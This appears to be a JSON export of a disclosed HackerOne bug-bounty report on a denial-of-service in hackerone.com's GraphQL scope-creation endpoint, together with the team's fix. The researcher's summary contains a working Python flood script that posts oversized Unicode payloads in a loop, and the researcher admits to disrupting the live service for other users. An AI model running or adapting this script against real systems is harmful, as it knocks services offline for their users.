{
  "id": 887321,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODczMjE=",
  "url": "https://hackerone.com/reports/887321",
  "title": "Uploading large payload on domain instructions causes server-side DoS",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-05-30T05:59:01.683Z",
  "submitted_at": "2020-05-30T05:59:01.683Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "dogpiss",
    "url": "/dogpiss",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/06bfjql7cna2j4ncfgkuat8xi8xx/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13,
    "url": "https://hackerone.com/security",
    "handle": "security",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "HackerOne",
      "twitter_handle": "Hacker0x01",
      "website": "https://hackerone.com",
      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": true,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-06-20T06:44:00.706Z",
  "bug_reporter_agreed_on_going_public_at": "2020-06-20T06:44:00.549Z",
  "team_member_agreed_on_going_public_at": "2020-06-20T06:40:17.750Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "bounty_amount": "2500.0",
  "formatted_bounty": "$2,500",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-07-20T06:40:17.890Z",
  "allow_singular_disclosure_after": -112604720.43840668,
  "singular_disclosure_allowed": true,
  "vote_count": 195,
  "voters": [
    "omarelfarsaoui",
    "silvertone",
    "is-",
    "a_d_a_m",
    "drsniper",
    "r0nz",
    "badcracker",
    "base_64",
    "roland_hack",
    "trieulieuf9",
    "and 185 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 6.1,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 3,
    "asset_type": "URL",
    "asset_identifier": "hackerone.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 23108,
      "category": "team",
      "content": "This was a DoS vulnerability in a specific endpoint that didn't limit the size of the upload. As explained in the hacker summary, we limited the payload to mitigate the attack.",
      "user": {
        "id": 13117,
        "username": "bencode",
        "name": "Ben Willis",
        "bio": "Full stack web developer working at Hackerone to make the internet safer.",
        "cleared": false,
        "verified": false,
        "website": "https://bwillis.github.io",
        "location": "San Francisco",
        "created_at": "2014-10-16T22:43:02.222Z",
        "url": "https://hackerone.com/bencode",
        "hackerone_triager": false,
        "hackerone_employee": true,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "id": 23105,
      "category": "researcher",
      "content": "**Note : To everyone who sees this report, if a program accepts DoS vulnerabilities please try to try test carefully as it is not ideal to disrupt services for everyone. I would advise you that when testing for DoS, once you receive an error and get huge amounts of delays please stop immediately, and report right away. Do not do what I did on this report. Thank you!**\n\n---\n\nOn the program [sandbox](https://hackerone.com/teams/new/sandbox) I have found that when creating domain instructions when adding a scope there is no input validation which was the cause of the server-side DoS. The character limit on the big input boxes is set to 10k, however with this I observed that there was not any, at first I reported this as a client-side DoS because it would render the scope management page unusable and there was no way to delete it, it was then closed as a duplicate of #584030 however digging further into this, I made a python script that allowed me to upload large amounts of payloads every request I then put it into a loop and around 350+ request I noticed an **HTTP 500 Internal Server Error** I then stopped to see if I had caused disruption, at first the page were loading fine so I run the python script again **(note : I was running this python script on 4 terminals)** and again, after a while this is when I noticed disruption on my side, and to confirm I asked the people from discord if they got disruption and they did. They received an a **502, and a 504 HTTP** errors, and caused disruption on my side as well.\n\n**Python Script (note: you need to put your own cookies if you want to try)**\n```\n\nimport requests\n\ng = input(\"Enter : \") \n\nburp0_url = \"https://hackerone.com:443/graphql\"\nburp0_cookies = x\nburp0_headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"https://hackerone.com/testingfordos/scopes/new\", \"content-type\": \"application/json\", \"X-Auth-Token\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTI1MzI0MzV9.qyfpwC--aQXOLd9TQ7l-016rI0wXZ33ocCvL10DU6dc----5047344\", \"Origin\": \"https://hackerone.com\", \"Connection\": \"close\"}\n\na = \"\"\n\nfor i in range(15000):    \n    a += \"بٍٍٍٍََُُُِّّّْرٍٍٍٍََُُِِّّّْآٍٍٍَُّ\"\n\nfor i in range(50):\n\n    burp0_json={\"operationName\": \"CreateStructuredScope\", \"query\": \"mutation CreateStructuredScope($team_id: ID!, $asset_type: StructuredScopeAssetTypeEnum, $asset_identifier: String!, $eligible_for_bounty: Boolean, $eligible_for_submission: Boolean, $instruction: String, $availability_requirement: String, $confidentiality_requirement: String, $integrity_requirement: String, $reference: String, $notify_subscribers_of_changes: Boolean, $custom_message: String, $label_ids: [ID!]) {\\n  createStructuredScope(input: {team_id: $team_id, asset_type: $asset_type, asset_identifier: $asset_identifier, eligible_for_bounty: $eligible_for_bounty, eligible_for_submission: $eligible_for_submission, instruction: $instruction, availability_requirement: $availability_requirement, confidentiality_requirement: $confidentiality_requirement, integrity_requirement: $integrity_requirement, reference: $reference, notify_subscribers_of_changes: $notify_subscribers_of_changes, custom_message: $custom_message, label_ids: $label_ids}) {\\n    was_successful\\n    team {\\n      id\\n      structured_scopes(first: 500) {\\n        edges {\\n          node {\\n            id\\n            __typename\\n          }\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    errors(first: 100) {\\n      edges {\\n        node {\\n          id\\n          type\\n          field\\n          message\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\", \"variables\": {\"asset_identifier\": str(i) + str(g) + \".com\", \"asset_type\": \"URL\", \"availability_requirement\": \"high\", \"confidentiality_requirement\": \"high\", \"eligible_for_bounty\": True, \"eligible_for_submission\": True, \"instruction\": a+a+a+a+a+a+a+a+a+a, \"integrity_requirement\": \"high\", \"label_ids\": [], \"notify_subscribers_of_changes\": True, \"reference\": \"sadasdasdas\", \"team_id\": \"Z2lkOi8vaGFja2Vyb25lL1RlYW0vNDkwNzg=\"}}\n\n    x = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)\n    print(str(x.status_code) + \" Status - Delay : \" + str(x.elapsed.total_seconds()) + \" seconds\")\n    print(x._content)\n```\n**Steps To Reproduce :**\n>1. Add a domain on Scope Management\n2. Intercept this POST /graphql the one with the \"operationName\":\"CreateStructuredScope\"\n3. Now put a huge payload on instruction parameter and keep sending it\n4. Reload pages until disruption is observed\n\nThe report was then triaged right 10 mins after reporting, and I was told by @jobert to stop my test. The team then rolled a fix which looked like this :\n\n```\ndiff --git a/app/models/structured_scope.rb b/app/models/structured_scope.rb\nindex f975f383c4..6c3928d2a7 100644\n--- a/app/models/structured_scope.rb\n+++ b/app/models/structured_scope.rb\n@@ -97,7 +97,8 @@ class StructuredScope < ApplicationRecord\n     AVAILABILITY_REQUIREMENT,\n   ].freeze\n\n-  MAX_INSTRUCTION_LENGTH = 5000\n+  MAX_INSTRUCTION_LENGTH = 10000\n+  MAX_REFERENCE_LENGTH = 1000\n\n   validates :asset_identifier, presence: true\n   validates :asset_type, inclusion: { in: ASSET_TYPES }\n@@ -109,7 +110,8 @@ class StructuredScope < ApplicationRecord\n   }\n   validate :eligibility\n   validates_with CountryValidator, fields: [:country], alpha2: true\n-  validates :instruction, length: { maximum: MAX_INSTRUCTION_LENGTH }, on: :create\n+  validates :instruction, length: { maximum: MAX_INSTRUCTION_LENGTH }\n+  validates :reference, length: { maximum: MAX_REFERENCE_LENGTH }\n```\n\nAs you can see, there is now input validation to this which immediately stopped the server-side DoS from happening as it would block the request. Again, please test responsibly for DoS vulnerabilities responsibly don't cause harm to program's services. Thank you! :)\n",
      "user": {
        "id": 966724,
        "username": "dogpiss",
        "name": "🗿",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2020-02-29T11:42:28.445Z",
        "url": "https://hackerone.com/dogpiss",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/06bfjql7cna2j4ncfgkuat8xi8xx/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/06bfjql7cna2j4ncfgkuat8xi8xx/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/06bfjql7cna2j4ncfgkuat8xi8xx/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
